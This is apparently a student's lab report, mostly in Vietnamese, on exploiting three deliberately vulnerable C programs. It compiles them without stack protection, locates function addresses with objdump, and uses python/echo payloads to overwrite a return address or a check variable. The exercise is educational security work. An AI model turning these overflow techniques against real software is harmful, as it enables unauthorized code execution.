# LAB 1

**Run vitual environment by docker file (using for attacking three files: bof1, bof2, bof3)**

`docker run -it --privileged -v D:\IS\Security-labs\Software\buffer-overflow:/home/seed/seclabs img4lab`

## Conduct bof1.c

**Run bof1.c file** 

`gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2`
![alt text](./images/gcc.png)
 Đặt tên cho tệp thực thi đầu ra là `bof1.out`
 `-fno-stack-protector:`Tắt tính năng bảo vệ stack (stack protector). Stack protector là cơ chế bảo vệ chống lại các cuộc tấn công buffer overflow bằng cách thêm "canaries" vào stack. Tùy chọn này tắt tính năng đó, giúp dễ dàng kiểm tra hoặc khai thác lỗ hổng tràn bộ đệm (buffer overflow).

 `-mpreferred-stack-boundary=2:`Điều chỉnh căn chỉnh (alignment) stack cho các hàm và biến cục bộ. Tùy chọn này đặt độ căn chỉnh của stack thành 2 (tức là 4 byte, vì căn chỉnh 2^n byte). Điều này có thể làm cho chương trình dễ bị khai thác hơn khi kết hợp với các lỗi như buffer overflow.

**Tìm hàm secretFunc()**

`objdump -d bof1.out|grep secretFunc`

![alt text](./images/objdump1.png)
`objdump`: Là một công cụ để hiển thị thông tin về các tệp binary hoặc file bof1.out.
`-d:` Tùy chọn này yêu cầu objdump giải mã và hiển thị phần mã lệnh của tệp **bof1.out**. Điều này có nghĩa là lệnh sẽ giải mã phần mã máy trong tệp bof1.out và hiển thị dưới dạng mã hợp ngữ *(assembly code)*.

`| grep secretFunc:`
`| (pipe):` Ký tự pipe (|) dùng để chuyển đầu ra từ lệnh phía bên trái (trong trường hợp này là objdump) thành đầu vào cho lệnh phía bên phải (trong trường hợp này là grep).
`grep secretFunc:` Grep là công cụ tìm kiếm văn bản. Nó sẽ tìm kiếm chuỗi ký tự "secretFunc" trong đầu ra của lệnh  `objdump -d`  .

=> Cụ thể, grep secretFunc sẽ tìm và chỉ hiển thị những dòng nào chứa từ "secretFunc" trong phần mã lệnh disassembly của tệp bof1.out.
Ta có địa chỉ của hàm secretFunc() là: `0804846b`

**Stack frame bof1**

![alt text](./images/Stackframe1.png)

=> *Buffer overflow sẽ ngừng tại 205 bytes tại return address.*

**Thực hiện chạy chương trình**

Dòng lệnh này tạo ra một chuỗi 204 ký tự 'a', tiếp theo là một địa chỉ bộ nhớ cụ thể, rồi truyền chuỗi đó vào chương trình bof1.out.
Mục đích là để gây ra một cuộc buffer overflow và thay đổi địa chỉ trả về của chương trình, nhằm chiếm quyền điều khiển hoặc thực thi mã tại địa chỉ đó.
 `echo $(python -c "print('a'*204 + '\x6b\x84\x04\x08')") | ./bof1.out`

![alt text](./images/echo1.png)

=> Missing argument =>Thành công



## Run bof2.c


- Kích thước của buf: trong trường hợp này mình đang sử dụng `fgets(buf, 45, stdin);`, nhưng kích thước của mảng buf chỉ là 40 bytes. Điều này có thể gây ra tràn bộ nhớ (buffer overflow) nếu nhập dữ liệu dài hơn 39 ký tự (cộng với ký tự null \0).

- Đoạn mã sẽ kiểm tra giá trị của check. Để thay đổi giá trị này từ 0x04030201 sang 0xdeadbeef
 
**Stackframe bof2**

![alt text](./images/Stackframe2.png)

**Chạy file bof2.c  bằng gcc**


`gcc -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2`

![alt text](./images/gcc2.png)

**Chạy chương trình**

`echo $(python -c "print('a'*40 + '\xef\xbe\xad\xde')") | ./bof2.out`

![alt text](./images/echo2.png)

=> Khai thác thành công lỗ hổng tràn bộ nhớ trong chương trình.


## Run bof3.c


- Trong trường hợp này, mảng `buf[]` có 128 phần tử, nhưng lệnh `fgets()` đọc tới 133 phần tử.

 => Nếu nhập dữ liệu đủ dài (hơn 128 ký tự), vùng nhớ sau buf sẽ bị ghi đè, dẫn đến tràn bộ nhớ.

**Stack frame**

![alt text](./images/Stackframe3.png)

**Run the bof3.c file**

`gcc -g bof3.c -o bof3.out -fno-stack-protector -mpreferred-stack-boundary=2`

![alt text](./images/gcc3.png)
**Lấy địa chỉ hàm shell:**
`objdump -d bof3.out|grep shell`

![alt text](./images/objdump3.png)

=> Vậy địa chỉ của hàm shell là: `0804845b`

**Chạy chương trình**

`echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.out`

![alt text](./images/echo3.png)

=> Thành công
